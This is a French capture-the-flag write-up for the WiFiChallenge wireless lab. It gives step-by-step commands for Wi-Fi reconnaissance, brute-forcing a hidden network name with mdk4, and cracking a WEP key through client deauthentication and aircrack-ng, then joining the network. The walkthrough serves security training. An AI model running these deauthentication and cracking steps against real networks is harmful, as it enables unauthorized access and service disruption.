# lab.wifichallenge.com

Téléchargement de la VM : https://drive.proton.me/urls/Q4WPB23W7R#Qk4nxMH8Q4oQ

## Challenges 

### 1) Reconnaissance

#### Lister les clients et voir le canal de "wifi-global"

Capturer tous les paquets du réseau :

    sudo airmon-ng check kill
    sudo airmon-ng start wlan0
    
    airodump-ng wlan0mon -w scan --manufacturer --wps --band abg
    # --band abg permet de scanner 2,4Ghz et 5Ghz
    
Isoler le canal 44 si besoin : 

    airodump-ng wlan0mon -w scan --manufacturer --wps --band abg -c44


#### Obtenir l'adresse MAC du client "wifi-IT"

On capture les paquets comme avant puis on isole le canal 11 : 

    airodump-ng wlan0mon -w recon --manufacturer --wps --band abg
    airodump-ng wlan0mon -w recon --manufacturer --wps --band abg -c11
    
Création d'une base de données locale avec les résultats de la capture : 
    
    python3 ~/tools/wifi_db/wifi_db.py -d wifi.db ./recon*
    sqlitebrowser wifi.db
    
Il n'y a ensuite plus qu'à chercher le point d'accès voulu dans les différentes tables.

#### Trouver le probe de 78:C1:A7:BF:72:46

Même démarche qu'avant : 

    sudo airmon-ng check kill
    sudo airmon-ng start wlan0
    airodump-ng wlan0mon -w recon --manufacturer --wps --band abg
    python3 ~/tools/wifi_db/wifi_db.py -d wifi.db ./recon*
    sqlitebrowser wifi.db
    
#### Donner le ESSID du point d'accès caché 

On sait que l'adresse MAC du réseau est F0:9F:C2:6A:88:26

Identifier le canal du réseau :

    airodump-ng wlan0mon

Changement de canal et bruteforcing des noms avec mdk4 :

    iwconfig wlan0mon channel 11
    
    cat ~/rockyou-top100000.txt | awk '{print "wifi-" $1}' > ~/wifi-rockyou.txt
    
    mdk4 wlan0mon p -t F0:9F:C2:6A:88:26 -f ~/wifi-rockyou.txt

### 2) WEP

Le chiffrement WEP est vulnérable parce que chaque paquet transmis contient un IV (vecteur d'initialisation), et avec suffisamment de paquets capturés, il est possible de deviner la clé WEP. Le but est donc de capturer le plus de paquets possible pour extraire ces IVs et ensuite les utiliser pour craquer la clé WEP.

Si il n'y a aucun client, et donc peu de paquets, on peut quand même passer par les techniques d'injection de paquets ou de fake authentication. 

#### Trouver le flag de "wifi-old"

Reconnaissance : 

    sudo airmon-ng check kill
    sudo airmon-ng start wlan0
    airodump-ng wlan0mon -w wep --manufacturer --wps --band abg
    
On voit bien une ligne sur un réseau WEP : 

>  F0:9F:C2:71:22:11  -28       50     1795    0   3   54   WEP  WEP                wifi-old              Ubiquiti Networks Inc. 
    
    
Capture spécifique :

    airodump-ng wlan0mon -w wep --manufacturer --wps --band abg --bssid F0:9F:C2:71:22:11
    
On voit une station DA:92:58:2A:BF:A3 connectée.

Attaque à faire en parallèle pour désauthentifier les clients et capturer plus de données plus vite :
  
    aireplay-ng --deauth 10 -a F0:9F:C2:71:22:11 -c DA:92:58:2A:BF:A3 wlan0mon

Attaque finale avec Aircrack : 

    sudo aircrack-ng wep-01.cap

Après un peu d'attente on obtient bien la clé :

> KEY FOUND! [ 11:BB:33:CD:55 ] 

Connexion finale à ce point d'accès : 

    sudo airmon-ng stop wlan0mon  
    sudo apt install wpasupplicant
    sudo systemctl restart wpa_supplicant.service
    sudo systemctl restart network*
    sudo vim /etc/wpa_supplicant/wep.conf

Contenu du fichier : 

    network={
            ssid="wifi-old"
            key_mgmt=NONE
            wep_key0=11BB33CD55
            wep_tx_keyidx=0
    }

Connexion : 

     wpa_supplicant -D nl80211 -i wlan2 -c /etc/wpa_supplicant/wep.conf
     sudo dhclient wlan1 -v


    

    
